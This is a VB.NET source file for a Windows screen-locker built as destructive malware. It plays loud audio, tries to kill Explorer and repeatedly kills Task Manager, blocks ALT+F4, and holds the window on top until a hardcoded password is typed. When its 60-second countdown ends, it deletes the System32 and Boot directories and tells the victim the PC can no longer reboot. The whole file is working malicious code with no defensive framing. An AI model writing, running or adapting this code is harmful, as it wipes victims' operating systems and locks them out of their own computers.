'Imports
Imports System.IO
Imports WMPLib
Imports System.Runtime.InteropServices

Public Class Form1
    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        'earrape despacito
        wmp1.URL = "https://instaud.io/_/2rYe.mp3"
        If Timer2.Enabled = True Then
            Timer2.Start()
        Else
            Label2.Text = 60
            Timer2.Start()
            'hides taskbar in windows
        End If
        For Each p As Process In Process.GetProcesses
            If p.ProcessName = "explore" Then
                p.Kill()
            End If
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'Essentially "Locks" the screen
        Me.TopMost = True
        Me.BringToFront()
        Me.Focus()
        'Disables Task Manager
        For Each selProcess As Process In Process.GetProcesses
            If selProcess.ProcessName = "taskmgr" Then
                selProcess.Kill()
                Exit For
            End If
        Next
        Me.Enabled = True
    End Sub
    'Disables ALT+F4
    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
            MessageBox.Show("LOL NO SILLY", "Security", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    'Closes Locker if correct password is typed
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "Yeet" Then
            Me.Close()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        'Sets timer interval
        Timer2.Start()
        Timer2.Interval = 1000
        'Deletes System32 and Boot directory upon timer reaching 0
        If Label2.Text = 0 Then
            Timer2.Enabled = False
            My.Computer.FileSystem.DeleteDirectory("C:\Windows\System32", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory("C:\Windows\Boot", FileIO.DeleteDirectoryOption.DeleteAllContents)
            MsgBox("You Are No Longer Able To Reboot Your PC ~Yen <3")
            'My Twitter <3
            Process.Start("https://twitter.com/SaltyWomen")
        Else
            Label2.Text = Val(Label2.Text) - 1
        End If
    End Sub
End Class
